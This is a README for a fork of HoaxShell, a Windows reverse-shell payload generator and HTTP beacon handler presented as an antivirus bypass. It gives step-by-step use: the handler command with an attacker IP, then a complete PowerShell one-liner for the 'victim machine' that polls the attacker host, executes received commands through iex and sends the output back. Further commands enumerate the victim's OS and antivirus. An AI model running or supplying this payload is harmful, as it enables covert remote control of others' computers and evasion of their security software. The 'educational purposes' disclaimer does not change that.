<h1 style="font-size:10vw" align="left">HoaxShell - Bypassing an Active Windows Security</h1>


[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.11-blueviolet.svg)](https://www.python.org/) <img src="https://img.shields.io/badge/Antivirus%20Bypassed-%E2%89%A5%20Yes-blue">
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">


******
⚠️ *For educational and authorized security research purposes only*


## Original Exploit Authors
Very grateful to the original script author [t3l3machus](https://github.com/t3l3machus)


## Description
Hoaxshell is a windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell, based on the following concept:  

![image](https://user-images.githubusercontent.com/75489922/197529603-1c9238ea-af14-41f7-8834-dd37ad77e809.png)

This c2 concept (which could be implemented by using protocols other than http or pre-installed exes) can be used to establish sessions that promote the illusion of having a shell, but are far from an actual pty.


## Demo
![bypass](https://github.com/asepsaepdin/hoaxshell/assets/122620685/a00ade63-5e5d-4663-80fd-b7e9b0d4c755)


******
## Step Guides
1. First, install all the requirements

   ```bash
   sudo pip3 install -r requirements.txt
   ```

2. Make the script executable

   ```bash
   chmod +x hoaxshell.py
   ```

3. Run the script and specify  the **-s 192.168.25.72** with the perpetrator's address

   ```bash
   ./hoaxshell.py -s 192.168.25.72 -r -H "Authorization"
   ```

> **Notes**: specify -s options with the attacker IP address

4. Run the script in powershell on the victim machine with some obfuscation technique

   ```powershell
   $xxxxx='None';$s='192.168.25.72:8080';$i='7f588da6-a3488a4c-7fa96807';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/7f588da6 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/a3488a4c -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxxxx) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/7fa96807 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} 
   ```

5. Check the operating system information used by victim machine

   ```powershell
   systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
   ```

6. And check the antivirus product used by victim machine

   ```powershell
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
   ```




******
## Credits
- https://github.com/t3l3machus/hoaxshell#AV-Bypass-PoCs
- https://www.youtube.com/watch?v=3HddKylkRzM
- https://www.youtube.com/watch?v=fgSARG82TJY
- https://www.revshells.com/
